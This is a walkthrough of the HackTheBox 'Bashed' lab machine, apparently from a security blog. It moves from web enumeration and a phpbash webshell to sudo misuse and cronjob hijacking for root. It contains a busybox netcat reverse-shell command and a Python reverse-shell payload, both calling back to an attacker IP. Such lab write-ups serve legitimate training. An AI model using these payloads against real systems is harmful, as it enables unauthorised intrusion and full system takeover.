---
categories:
- Hackthebox
image:
  path: bashed.png
layout: post
media_subpath: /assets/images/bashed
tags:
- hackthebox
- writeup
- linux
- webshell
- sudo
- cronjob
- privilege-escalation
- easy
title: HTB - Bashed Walkthrough
---



## Introduction

Bashed is an easy-difficulty Linux machine that demonstrates basic web enumeration, webshell access, and cronjob abuse for privilege escalation. The attack path involves discovering a hidden development directory with a webshell, escalating to a service account via sudo, and then hijacking a cronjob running as root to gain full system compromise.
## Reconnaissance
### Port Scanning

Initial `nmap` scan reveals only port 80 open:
```
# Nmap 7.95 scan initiated Wed Jul  2 08:56:07 2025 as: /usr/lib/nmap/nmap --privileged -p80 -sC -sV -oA nmap/Bashed 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

**Key Findings:**

- **Port 80/tcp:** Apache 2.4.18 (Ubuntu)
- Website title: "Arrexel's Development Site"
### Web Enumeration

Visiting the website reveals a blog/development site:

![img](Pasted image 20250703102909.png)

### Directory Brute Forcing

Using `gobuster` to discover hidden directories:

```bash
gobuster dir -u http://10.10.10.68/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 100 -q -x html,git,txt -o files/root-gobuster 
<snip>
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/.html                (Status: 403) [Size: 291]
/index.html           (Status: 200) [Size: 7743]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/contact.html         (Status: 200) [Size: 7805]
/about.html           (Status: 200) [Size: 8193]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
/single.html          (Status: 200) [Size: 7477]
/scroll.html          (Status: 200) [Size: 10863]
/.html                (Status: 403) [Size: 291]
/server-status        (Status: 403) [Size: 299]
```
## Initial Access

### Dev Directory Discovery

The `/dev` directory is particularly interesting as it reveals a directory listing:

![img](Pasted image 20250703103242.png)

**Files found:**

- `phpbash.php`
- `phpbash.min.php`


### Webshell Access

Both files are instances of **phpbash** - a PHP web shell that provides a terminal-like interface. Accessing either file presents a web-based shell:

![img](Pasted image 20250703103411.png)

**User flag:** `/home/arrexel/user.txt`


**Technical Concept:** phpbash is a standalone PHP script that executes system commands through the `shell_exec()` function. It provides a browser-based terminal interface, making it useful for initial foothold but limited in functionality compared to a full reverse shell.

### Initial Shell

The webshell runs as the `www-data` user:
## Privilege Escalation

### Sudo Privileges Check

Checking what commands `www-data` can run with sudo:

```bash
www-data@bashed:/var/www/html/dev# sudo -l

  
Matching Defaults entries for www-data on bashed:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User www-data may run the following commands on bashed:  
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

**Technical Concept:** This means `www-data` can run ANY command as the `scriptmanager` user without providing a password.

### Switching to scriptmanager

```bash
www-data@bashed:/home/scriptmanager# cat shell.sh
busybox nc 10.10.14.11 9001 -e /bin/bash

www-data@bashed:/home/scriptmanager# sudo -u scriptmanager /bin/bash



rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.68] 55850
id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)

```

### Cronjob Discovery

Exploring the filesystem reveals a `/scripts` directory owned by `scriptmanager`:

```bash
scriptmanager@bashed:/$ ls -la /scripts
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jul  1 23:49 scripts
```

Inside, there's a Python script:

```bash
scriptmanager@bashed:/scripts$ cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

### Identifying Cronjob

After waiting a moment, a new file appears:
```
scriptmanager@bashed:/scripts$ ls -la
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Jul  3 00:46 test.txt
```

**Key Observations:**

- `test.py` is owned by `scriptmanager`
- `test.txt` is created by `root`
- The file is being written automatically

**Conclusion:** A cronjob is running `test.py` as the `root` user!

### Technical Concept: Cronjob Abuse

Cronjobs are scheduled tasks that run at specific intervals. When a script is writable by a lower-privileged user but executed by a higher-privileged user, it creates a privilege escalation vector.

### Malicious Python Script

Replace `test.py` with a reverse shell payload:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.11",9002))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
```

### Root Shell

Start listener on attack machine:

```
rlwrap nc -nlvp 9002
```

Wait for the cronjob to execute (typically within 1-2 minutes):

```
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.68] 36008
root@bashed:/scripts# whoami
root
```

**Root flag:** `/root/root.txt`
